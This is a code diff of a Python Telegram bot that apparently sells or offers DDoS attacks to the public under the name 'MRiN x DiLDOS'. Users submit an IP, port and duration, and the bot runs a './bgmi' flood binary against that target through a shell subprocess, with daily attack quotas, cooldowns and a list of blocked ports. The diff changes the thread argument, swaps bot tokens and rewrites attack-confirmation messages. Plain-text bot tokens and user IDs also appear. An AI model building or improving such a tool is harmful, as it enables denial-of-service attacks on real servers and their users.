@@ -10,8 +10,8 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-TOKEN = '7605790388:AAG3eU9kAeyvqfxI9SAEcYWaOoQ3e50KQqs' 
-CHANNEL_ID = '-1002197002727'
+TOKEN = '7773755329:AAELmC8OEC2ObClmvYA-Twlcb485-mGag0M' 
+CHANNEL_ID = '-1002444623350'
 required_channel = '@MRiNxDiLDOS'  # Replace with your actual channel username
 
 bot = telebot.TeleBot(TOKEN)
@@ -26,7 +26,7 @@ COOLDOWN_DURATION = 300  # Cooldown duration in seconds
 BAN_DURATION = timedelta(minutes=15)
 DAILY_ATTACK_LIMIT = 10  # Daily attack limit per user
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002]  # Blocked ports list
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002, 32000, 32001, 32003]  # Blocked ports list
 
 EXEMPTED_USERS = [6768273586, 1431950109, 6111808288, 1340584902, 5317827318, 7082215587, 2007860433, 7017469802]
 
@@ -80,7 +80,7 @@ async def run_attack(chat_id, ip, port, duration):
         try:
             # Run the shell command asynchronously
             process = await asyncio.create_subprocess_shell(
-                f"./bgmi {ip} {port} {duration} 900",
+                f"./bgmi {ip} {port} {duration} 50",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
@@ -97,7 +97,7 @@ async def run_attack(chat_id, ip, port, duration):
             # Notify the user that the attack has finished
             bot.send_message(
                 chat_id,
-                f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {ip} : {port} 𝙛𝙤𝙧 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™"
+                f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n •  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 : `{ip}` \n •  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗣𝗼𝗿𝘁 : `{port}`\n •  𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : `{duration}` 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™", parse_mode="Markdown"
             )
         except Exception as e:
             # Send an error message to the user in case of failure
@@ -122,11 +122,11 @@ def welcome_start(message):
 
     # Stylish welcome message
     welcome_text = (
-        f"     👋🏻 *𝗛𝗶𝗶𝗶,  {user_name} ! \n\n 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧*\n\n"
+        f"     👋🏻 *𝗛𝗶𝗶𝗶,  {user_name} ! \n 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧*\n\n"
         f"🆔  *𝗬𝗢𝗨𝗥 𝗨𝗦𝗘𝗥 - 𝗜𝗗 > * `{user_id}`\n"
         f"👤  *𝗬𝗢𝗨𝗥 𝗨𝗦𝗘𝗥 - 𝗡𝗔𝗠𝗘 > * `{user_name}`\n\n"
         "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿 👀*\n\n"
-        "       [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
+        "              [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
         "📌 *𝗧𝗿𝘆  𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:* `/bgmi` \n\n"
     )
 
@@ -171,6 +171,7 @@ def welcome_start(message):
         parse_mode="Markdown",
         disable_web_page_preview=True  # This disables the link preview
     )
+
 
 
 @bot.message_handler(commands=['bgmi'])
@@ -222,7 +223,7 @@ def bgmi_command(message):
                         parse_mode="Markdown"
                     )
             else:
-                bot.send_message(message.chat.id, message_text, parse_mode="Markdown")
+                bot.send_message(message.chat.id, message_text, parse_mode="Markdown", disable_web_page_preview=True)
             return
 
     except Exception as e:
@@ -244,7 +245,7 @@ def bgmi_command(message):
     # Reset counts daily
     reset_daily_counts()
 
-  
+ 
   # Check if two attacks are currently running
     if attack_semaphore._value == 0:  # Semaphore is fully utilized
         bot.send_message(
@@ -339,7 +340,7 @@ def bgmi_command(message):
         # Notify the attack has started
         bot.send_message(
             message.chat.id,
-            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {ip} : {port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n[ 𝙍𝙚𝙦𝙪𝙚𝙨𝙩𝙚𝙙 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣 : {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ]\n\n𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆'𝙨  𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔 = {remaining_attacks} 𝙤𝙪𝙩 𝙤𝙛 10  \n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
+            f"🚀𝙃𝙞𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨. \n\n •  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 : `{ip}` \n •  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗣𝗼𝗿𝘁 : `{port}`\n •  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : `{user_duration}` 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙡𝙚𝙛𝙩 𝙬𝙞𝙩𝙝 {remaining_attacks} 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙤𝙪𝙩 𝙤𝙛 𝟭𝟬  \n\n ‼️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘼𝙛𝙩𝙚𝙧𝙬𝙖𝙧𝙙𝙨 ‼️ ", parse_mode="Markdown"
         )
 
         # Run the attack asynchronously in a separate thread
